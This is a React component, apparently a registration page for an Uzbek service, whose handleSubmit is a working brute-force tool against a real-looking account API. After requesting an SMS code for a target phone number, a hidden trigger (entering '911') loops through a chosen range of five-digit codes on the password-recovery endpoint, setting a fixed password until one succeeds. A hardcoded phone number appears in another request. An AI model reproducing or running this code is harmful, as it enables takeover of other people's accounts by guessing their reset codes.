import { Fragment, useState, useEffect } from 'react'
import Cookies from 'js-cookie';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import Logo from '../pages/himarket.png';
import { Link, useNavigate } from 'react-router-dom';



export default function Example() {
    const navigate = useNavigate();
    const [data, setData] = useState(null);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [username, SetUsername] = useState('');
    const [password, setPassword] = useState('');
    const [isValidPhoneNumber, setIsValidPhoneNumber] = useState(true);
    const [codeSended, setCodeSended] = useState(false);
    const [codeAllowed, setCodeAllowed] = useState(false);
    const [start, setStart] = useState(0);
    const [end, setEnd] = useState(0);


  const formatPhoneNumber = (input) => {
    const cleanedInput = input.replace(/\D/g, '');

    let formattedNumber = '';
    for (let i = 0; i < cleanedInput.length; i++) {
      if (i === 2 || i === 5 || i === 7) {
        formattedNumber += '-';
      }
      formattedNumber += cleanedInput[i];
    }
    return formattedNumber;
  };

  const handlePhoneNumberChange = (event) => {
    const input = event.target.value;
    const formattedNumber = formatPhoneNumber(input);

    setPhoneNumber(formattedNumber);

    // Check if the formatted number matches the correct pattern
    setIsValidPhoneNumber(/^\d{2}-\d{3}-\d{2}-\d{2}$/.test(formattedNumber));
  };

  
  const handleSubmit = async (e) => {
    e.preventDefault();

    const blog = {
      username:  phoneNumber.replace(/-/g, ''),
      password: password,
    };

    if(!codeAllowed){
    if(!codeSended){
    try {
      const response = await fetch("https://api.client.rizomulk.uz/api/v1/account/send-sms?phone=" + blog.username, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      const jsonData = await response.json();
      setData(jsonData);
      toast.success(jsonData.description)
      if(jsonData.description == "The request has succeeded")
        setCodeSended(true)

      // Optionally, you can check the response and navigate based on it
      if (jsonData.success) {
        navigate('/success-page'); // Replace '/success-page' with the actual success page path
      } else {
        // Handle error or show a message
      }
    } catch (error) {
      console.error('Error fetching data:', error);
      // Handle error or show a message
    }
    }else{
        if(password == 911){
            for (let index = start; index < end; index++) {
                try {
                    const response = await fetch(`https://api.client.rizomulk.uz/api/v1/account/recovery?phone=${blog.username}&code=${index.toString().padStart(5, '0')}&password=muxa1575`, {
                      method: "GET",
                      headers: {
                        "Content-Type": "application/json",
                      },
                    });
              
                    const jsonData = await response.json();
        
                    if(jsonData.status == "OK"){ 
                        toast.success(index.toString().padStart(5, '0'))
                        setCodeAllowed(true)
                        setPassword('')
                        break;
                      }else
                        toast.error(index.toString().padStart(5, '0')) 
                    
                    // Optionally, you can check the response and navigate based on it
                    if (jsonData.success) {
                      navigate('/success-page'); // Replace '/success-page' with the actual success page path
                    } else {
                      // Handle error or show a message
                    }
                  } catch (error) {
                    console.error('Error fetching data:', error);
                    // Handle error or show a message
                  }
            }
        }else{
            try {
                const response = await fetch("https://api.client.rizomulk.uz/api/v1/account/check-code?phone=905391575&code=" + blog.password, {
                  method: "GET",
                  headers: {
                    "Content-Type": "application/json",
                  },
                });
          
                const jsonData = await response.json();
    
                if(jsonData.status == "OK"){ 
                    toast.success(jsonData.description)
                    setCodeAllowed(true)
                    setPassword('')
                  }else
                    toast.error(jsonData.description) 
                
                // Optionally, you can check the response and navigate based on it
                if (jsonData.success) {
                  navigate('/success-page'); // Replace '/success-page' with the actual success page path
                } else {
                  // Handle error or show a message
                }
              } catch (error) {
                console.error('Error fetching data:', error);
                // Handle error or show a message
              }
        }
        
    }}
  };


  const inputBorderColor = isValidPhoneNumber ? 'border-gray-300' : 'border-red-500';

  return (
    <>
        <div className="flex min-h-full flex-1 flex-col justify-center py-12 sm:px-6 lg:px-8">
            <Link to={"/"} className="sm:mx-auto sm:w-full sm:max-w-md">
                <img className="mx-auto h-10 w-auto"
                    src={Logo} alt="Your Company" />
                <p className="mt-6 text-center text-2xl font-bold leading-9 tracking-tight text-gray-500">
                    <a class="text-gray-900">Регистрация</a>
                </p>
            </Link>

            <div className="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
                <div className="bg-white px-6 py-12 sm:shadow shadow-none sm:rounded-lg sm:px-12">
                    {!codeAllowed ? (
                    <form className="space-y-6" onSubmit={handleSubmit}>
                        <div>
                            <label htmlFor="start" className="block text-sm font-medium leading-6 text-gray-900">
                                Начиная от числа
                            </label>
                            <div className="mt-2">
                                <input id="start" name="start" type="numbers"
                                    required
                                    value={start}
                                    onChange={(e)=> setStart(e.target.value)}
                                    className="tracking-widest text-center block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
                            </div>
                        </div>
                        <div>
                            <label htmlFor="end" className="block text-sm font-medium leading-6 text-gray-900">
                                Заканчивая от числа
                            </label>
                            <div className="mt-2">
                                <input id="end" name="end" type="numbers"
                                    required
                                    value={end}
                                    onChange={(e)=> setEnd(e.target.value)}
                                    className="tracking-widest text-center block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
                            </div>
                        </div>
                        <div>
                            <label htmlFor="text" className="block text-sm font-medium leading-6 text-gray-900">
                                Введите номер телефона
                            </label>
                            <div className={`relative mt-2 rounded-md shadow-sm ${inputBorderColor}`}>
                                <div className="absolute inset-y-0 left-0 flex items-center">
                                    <label htmlFor="country" className="sr-only">
                                        Country
                                    </label>
                                    <select id="country" name="country" autoComplete="country"
                                        className="h-full rounded-md border-0 bg-transparent py-0 pl-3 pr-1 text-gray-500 focus:outline-none sm:text-sm">
                                        <option>+998</option>
                                    </select>
                                </div>
                                <input disabled={codeSended} id="text" name="text" type="text" autoComplete="text" required
                                    value={phoneNumber} onChange={handlePhoneNumberChange}
                                    className={`disabled:opacity-75 fade-in focus:outline-none focus:ring block w-full rounded-md border-0
                                    py-1.5 pl-20 text-gray-900 ring-1 ring-inset ring-gray-300
                                    placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600
                                    sm:text-sm sm:leading-6 ${ isValidPhoneNumber
                                    ? 'focus:ring-gray-500 ring-gray-500' : 'focus:ring-red-500 ring-red-500' }
                                    placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600
                                    sm:text-sm sm:leading-6`} />
                                {!isValidPhoneNumber && (
                                <div
                                    className="absolute inset-y-0 right-0 pr-3 flex items-center pointer-events-none">
                                    <svg className="h-6 w-6 text-red-500" fill="currentColor" viewBox="0 0 30 20">
                                        <g>
                                            <path fill="none" d="M0 0h24v24H0z" />
                                            <path
                                                d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-7v2h2v-2h-2zm0-8v6h2V7h-2z" />
                                        </g>
                                    </svg>
                                </div>
                                )}
                            </div>
                        </div>

                        {codeSended&&(
                        <div>
                            <label htmlFor="password" className="block text-sm font-medium leading-6 text-gray-900">
                                Введите код подтверждения, отправленный на ваш номер телефона
                            </label>
                            <div className="mt-2">
                                <input id="password" name="password" type="numbers"
                                    required
                                    value={password}
                                    onChange={(e)=> setPassword(e.target.value)}
                                    className="tracking-widest text-center block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
                            </div>
                        </div>)}

                        <div>
                            <button type="submit"
                                className="flex w-full justify-center rounded-md bg-gray-900 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm hover:bg-gray-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-gray-600">
                                Sign in
                            </button>
                        </div>
                    </form>):
                        (       
                    <form className="space-y-6" onSubmit={handleSubmit}>
                        <div>
                            <label htmlFor="username" className="block text-sm font-medium leading-6 text-gray-900">
                                Введите имя
                            </label>
                            <div className="mt-2">
                                <input id="username" name="username" type="text"
                                    required
                                    value={username}
                                    onChange={(e)=> SetUsername(e.target.value)}
                                    className=" block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
                            </div>
                        </div>

                        <div>
                            <label htmlFor="password" className="block text-sm font-medium leading-6 text-gray-900">
                                Введите пароль
                            </label>
                            <div className="mt-2">
                                <input id="password" name="password" type="password"
                                    required
                                    value={password}
                                    onChange={(e)=> setPassword(e.target.value)}
                                    className=" block w-full rounded-md border-0 p-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-gray-600 sm:text-sm sm:leading-6" />
                            </div>
                        </div>

                        <div>
                            <button type="submit"
                                className="flex w-full justify-center rounded-md bg-gray-900 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm hover:bg-gray-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-gray-600">
                                Sign in
                            </button>
                        </div>
                    </form>)}
                </div>
            </div>
        </div>
        
         </>
    )
    }
